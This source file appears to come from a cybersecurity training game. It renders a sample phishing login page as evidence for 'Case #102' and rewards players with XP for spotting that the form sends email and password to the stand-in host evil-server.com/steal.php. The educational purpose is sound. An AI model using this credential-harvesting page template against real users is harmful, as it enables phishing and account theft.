import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { X, Copy, Award, HelpCircle, FileCode, AlertTriangle, ExternalLink } from 'lucide-react';
import GuidancePopup from '../../../components/os/GuidancePopup';
import './HtmlViewer.css';

// ===========================================
// PHISHING PAGE HTML CONTENT FOR CASE #102
// ===========================================
const phishingPageHtml = `<!DOCTYPE html>
<html>
<head>
  <title>Company Email Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    
    .login-card {
      background: white;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      width: 100%;
      max-width: 420px;
      overflow: hidden;
      animation: slideUp 0.5s ease;
    }
    
    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    .header {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      padding: 2rem;
      text-align: center;
    }
    
    .header-icon {
      font-size: 3rem;
      margin-bottom: 1rem;
      filter: drop-shadow(0 4px 6px rgba(0,0,0,0.2));
    }
    
    .header h1 {
      color: white;
      font-size: 1.8rem;
      margin: 0;
      font-weight: 600;
      text-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }
    
    .header p {
      color: rgba(255,255,255,0.9);
      font-size: 0.9rem;
      margin-top: 0.5rem;
    }
    
    .urgent-badge {
      background: #fed7d7;
      color: #c53030;
      padding: 0.5rem 1rem;
      border-radius: 50px;
      font-size: 0.8rem;
      font-weight: 600;
      display: inline-block;
      margin: 1rem 0 0.5rem;
      border: 1px solid #fc8181;
    }
    
    .content {
      padding: 2rem;
    }
    
    .form-group {
      margin-bottom: 1.5rem;
    }
    
    .form-group label {
      display: block;
      color: #4a5568;
      font-size: 0.9rem;
      font-weight: 600;
      margin-bottom: 0.5rem;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    
    .form-group input {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 2px solid #e2e8f0;
      border-radius: 10px;
      font-size: 1rem;
      transition: all 0.2s;
      background: #f7fafc;
    }
    
    .form-group input:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
    }
    
    .form-group input[readonly] {
      background: #f7fafc;
      color: #4a5568;
      cursor: not-allowed;
    }
    
    .login-btn {
      width: 100%;
      padding: 1rem;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-top: 1rem;
    }
    
    .login-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(102,126,234,0.3);
    }
    
    .security-note {
      margin-top: 2rem;
      padding: 1rem;
      background: #fefcbf;
      border-left: 4px solid #ecc94b;
      border-radius: 8px;
      font-size: 0.9rem;
      color: #744210;
    }
    
    .security-note strong {
      display: block;
      margin-bottom: 0.5rem;
      color: #975a16;
    }
    
    .malicious-alert {
      margin-top: 1rem;
      padding: 1rem;
      background: #fed7d7;
      border: 2px solid #fc8181;
      border-radius: 8px;
      color: #c53030;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    
    .footer {
      text-align: center;
      padding: 1.5rem 2rem;
      background: #f7fafc;
      border-top: 1px solid #e2e8f0;
      color: #718096;
      font-size: 0.8rem;
    }
  </style>
</head>
<body>
  <div class="login-card">
    <div class="header">
      <div class="header-icon">📧</div>
      <h1>Company Email</h1>
      <p>Secure Enterprise Login</p>
    </div>
    
    <div class="content">
      <div style="text-align: center;">
        <span class="urgent-badge">⚠️ URGENT: Password Expires in 24h</span>
      </div>
      
      <form action="http://evil-server.com/steal.php" method="POST">
        <div class="form-group">
          <label>Email Address</label>
          <input type="email" name="username" placeholder="Enter your email" value="sarah@company.com">
        </div>
        
        <div class="form-group">
          <label>Password</label>
          <input type="password" name="password" placeholder="Enter your password" value="password123">
        </div>
        
        <button type="submit" class="login-btn">LOGIN TO KEEP PASSWORD</button>
      </form>
      
      <div class="security-note">
        <strong>🔒 Note:</strong> This page looks exactly like the real company login page.
      </div>
      
      <div class="malicious-alert">
        <span>⚠️</span>
        <span><strong>SUSPICIOUS:</strong> The form submits to <strong>evil-server.com</strong></span>
      </div>
    </div>
    
    <div class="footer">
      IT Security Department • Password expires in 24 hours
    </div>
  </div>
</body>
</html>`;

// ===========================================
// DISCOVERY 3 DEFINITION
// ===========================================
const discovery3 = {
  id: 3,
  name: 'Phishing Page Analyzed',
  file: 'phishing_page.html',
  xp: 15,
  description: 'The fake login page submits credentials to evil-server.com',
  evidence: '<form action="http://evil-server.com/steal.php" method="POST">',
  nextStep: 'Trace where evil-server.com is located',
  nextStepApp: 'terminal',
  nextStepCommand: 'nslookup evil-server.com'
};

const HtmlViewer = () => {
  const navigate = useNavigate();
  const location = useLocation();
  
  // Get data from navigation state
  const { userId, caseId = '101', file, content } = location.state || { caseId: '101' };
  
  // State for discovery
  const [showGuidance, setShowGuidance] = useState(false);
  const [currentDiscovery, setCurrentDiscovery] = useState(null);
  const [discoveryFound, setDiscoveryFound] = useState(false);
  const [copySuccess, setCopySuccess] = useState(false);
  const [copyMessage, setCopyMessage] = useState('');
  const [pendingNavigation, setPendingNavigation] = useState(null);
  
  // Check if discovery already found
  useEffect(() => {
    if (caseId === '#102' || caseId === '102') {
      const discoveries = JSON.parse(localStorage.getItem('case102_discoveries') || '[]');
      if (discoveries.includes(3)) {
        setDiscoveryFound(true);
      }
    }
  }, [caseId]);

  // Handle discovery save
  const handleDiscoverySave = () => {
    if ((caseId !== '#102' && caseId !== '102') || discoveryFound) return;
    
    // Create note
    const now = new Date();
    const timestamp = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).replace(',', '');

    const evidenceText = `PHISHING PAGE ANALYSIS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

The fake login page submits credentials to:

🌐 DESTINATION: http://evil-server.com/steal.php
📧 FORM ACTION: POST
🔑 FIELDS: email, password

HTML CODE:
<form action="http://evil-server.com/steal.php" method="POST">
  <input type="email" name="username">
  <input type="password" name="password">
  <button type="submit">LOGIN TO KEEP PASSWORD</button>
</form>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ This is NOT the company domain!
✅ Click COPY TO NOTES to save this discovery! (+15 XP) ⭐ DISCOVERY #3`;

    const note = {
      id: Date.now(),
      noteId: Date.now(),
      timestamp,
      title: 'DISCOVERY: Phishing Page Analyzed',
      content: evidenceText,
      source: 'phishing_page.html',
      xp: 15,
      isDiscovery: true,
      caseId: '102',
      discoveryId: 3,
      createdAt: new Date().toISOString(),
      type: 'note'
    };

    // Save to localStorage
    const existingNotes = JSON.parse(localStorage.getItem('case102_notes') || '[]');
    const updatedNotes = [note, ...existingNotes];
    localStorage.setItem('case102_notes', JSON.stringify(updatedNotes));

    // Update discoveries
    const discoveries = JSON.parse(localStorage.getItem('case102_discoveries') || '[]');
    const updatedDiscoveries = [...discoveries, 3];
    localStorage.setItem('case102_discoveries', JSON.stringify(updatedDiscoveries));

    // Update XP
    const currentXP = parseInt(localStorage.getItem('case102_xp') || '0');
    localStorage.setItem('case102_xp', (currentXP + 15).toString());

    // Save to MongoDB with correct collection name
    if (userId) {
      const cleanNote = {
        id: note.id,
        noteId: note.noteId,
        timestamp: note.timestamp,
        title: note.title,
        content: note.content,
        source: note.source,
        isConclusion: false,
        caseId: '102',
        createdAt: note.createdAt,
        type: 'note'
      };
      
      fetch('http://localhost:5000/api/level2progresses/add-note', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          note: cleanNote,
          xpEarned: 15,
          discoveryId: 3
        })
      }).catch(err => console.error('Error saving to MongoDB:', err));
    }

    // Show success and guidance
    setDiscoveryFound(true);
    setCopyMessage('🎉 NEW DISCOVERY! +15 XP');
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 3000);
    
    // ===== FIXED: Show guidance popup =====
    const popupDiscovery = {
      id: discovery3.id,
      name: discovery3.name,
      description: discovery3.description,
      xp: discovery3.xp,
      nextStep: discovery3.nextStep,
      nextStepApp: discovery3.nextStepApp,
      nextStepCommand: discovery3.nextStepCommand,
      evidence: evidenceText
    };
    
    setCurrentDiscovery(popupDiscovery);
    setShowGuidance(true);
    
    // Store navigation data
    setPendingNavigation({
      userId: userId,
      caseId: '#102',
      newNote: note,
      discoveryId: 3,
      xpEarned: 15,
      isNewDiscovery: true
    });

    // Dispatch event for Case Notes
    window.dispatchEvent(new CustomEvent('case-notes-updated', { 
      detail: { 
        caseId: '102',
        notes: updatedNotes, 
        discoveries: [3], 
        xp: 15 
      }
    }));
  };

  // ===== FIXED: Handle popup actions =====
  const handlePopupAction = (app) => {
    console.log('Popup action clicked:', app);
    setShowGuidance(false);
    setCurrentDiscovery(null);
    
    if (app === 'terminal') {
      if (pendingNavigation) {
        // Navigate to terminal first, then to case notes after popup would have closed
        navigate('/terminal', { state: { userId, caseId: '#102' } });
        setPendingNavigation(null);
      } else {
        navigate('/terminal', { state: { userId, caseId: '#102' } });
      }
    } else if (app === 'case-notes') {
      if (pendingNavigation) {
        navigate('/case-notes', { state: pendingNavigation });
        setPendingNavigation(null);
      } else {
        navigate('/case-notes', { state: { userId, caseId: '#102' } });
      }
    } else if (app === 'file-explorer') {
      navigate('/file-explorer', { state: { userId, caseId: '#102' } });
    } else if (app === 'log-viewer') {
      navigate('/log-viewer', { state: { userId, caseId: '#102' } });
    }
  };

  // ===== FIXED: Handle popup close =====
  const handlePopupClose = () => {
    console.log('Popup closed');
    setShowGuidance(false);
    setCurrentDiscovery(null);
    
    if (pendingNavigation) {
      navigate('/case-notes', { state: pendingNavigation });
      setPendingNavigation(null);
    }
  };

  // Handle copy HTML code
  const handleCopyCode = () => {
    navigator.clipboard.writeText(phishingPageHtml);
    setCopyMessage('📋 HTML code copied to clipboard');
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 3000);
  };

  // Only show for Case #102
  if (caseId !== '#102' && caseId !== '102') {
    return (
      <div className="html-viewer-container">
        <div className="html-viewer-header">
          <div className="header-left">
            <FileCode size={18} className="text-gray-400" />
            <span className="text-white font-semibold">HTML VIEWER</span>
          </div>
          <button onClick={() => navigate('/os-desktop')} className="window-control">✕</button>
        </div>
        <div className="empty-state">
          <span className="empty-state-icon">📄</span>
          <p>No HTML file loaded</p>
          <p className="text-xs text-gray-600">Open phishing_page.html from File Explorer</p>
        </div>
      </div>
    );
  }

  return (
    <div className="html-viewer-container">
      {/* ===== FIXED: Guidance Popup with proper handlers ===== */}
      {showGuidance && currentDiscovery && (
        <GuidancePopup
          discovery={currentDiscovery}
          onClose={handlePopupClose}
          onAction={handlePopupAction}
        />
      )}

      {/* Success Toast */}
      {copySuccess && (
        <div className={`copy-toast ${copyMessage.includes('DISCOVERY') ? 'discovery' : 'normal'}`}>
          {copyMessage}
        </div>
      )}

      {/* Header */}
      <div className="html-viewer-header">
        <div className="header-left">
          <FileCode size={18} className="text-gray-400" />
          <span className="text-white font-semibold">HTML VIEWER - phishing_page.html</span>
          <div className="case-badge">Case #102</div>
        </div>
        
        <div className="header-right">
          <button onClick={handleCopyCode} className="copy-code-btn">
            <Copy size={14} /> Copy HTML
          </button>
          <button onClick={() => navigate('/os-desktop')} className="window-control">✕</button>
        </div>
      </div>

      {/* File Info Bar */}
      <div className="file-info-bar">
        <div className="file-info-content">
          <div className="file-path">
            <span className="info-label">Path:</span>
            <span className="info-value">/evidence/case102/suspicious_files/phishing_page.html</span>
          </div>
          <div className="file-stats">
            <span className="info-label">Size:</span>
            <span className="info-value">4.2 KB</span>
          </div>
        </div>
      </div>

      {/* Main Content - Split View */}
      <div className="html-viewer-main">
        {/* Left Panel - Rendered Page */}
        <div className="rendered-panel">
          <div className="panel-header">
            <span className="panel-title">📱 RENDERED PAGE</span>
            {!discoveryFound ? (
              <button onClick={handleDiscoverySave} className="discovery-btn">
                <Award size={12} /> SAVE DISCOVERY #3
              </button>
            ) : (
              <span className="discovery-found">✅ DISCOVERY #3 FOUND</span>
            )}
          </div>
          <div className="rendered-content" dangerouslySetInnerHTML={{ __html: phishingPageHtml }} />
        </div>

        {/* Right Panel - HTML Source */}
        <div className="source-panel">
          <div className="panel-header">
            <span className="panel-title">🔧 HTML SOURCE</span>
            <button onClick={handleCopyCode} className="copy-mini-btn" title="Copy HTML">
              <Copy size={14} />
            </button>
          </div>
          <pre className="source-code">
{`<form action="http://evil-server.com/steal.php" method="POST">
  <input type="email" name="username">
  <input type="password" name="password">
  <button type="submit">LOGIN TO KEEP PASSWORD</button>
</form>`}
          </pre>
          <div className="analysis-box">
            <div className="analysis-item">
              <span className="analysis-label">Form Action:</span>
              <span className="analysis-value malicious">http://evil-server.com/steal.php</span>
            </div>
            <div className="analysis-item">
              <span className="analysis-label">Method:</span>
              <span className="analysis-value">POST</span>
            </div>
            <div className="analysis-item">
              <span className="analysis-label">Fields:</span>
              <span className="analysis-value">email, password</span>
            </div>
            <div className="analysis-note">
              <AlertTriangle size={14} />
              <span>Credentials are sent to a malicious server!</span>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="html-viewer-footer">
        <div className="footer-left">
          <span className="text-gray-400">Click "SAVE DISCOVERY #3" to earn 15 XP</span>
        </div>
        <div className="footer-right">
          <span className="text-cyan-400">evil-server.com</span>
        </div>
      </div>
    </div>
  );
};

export default HtmlViewer;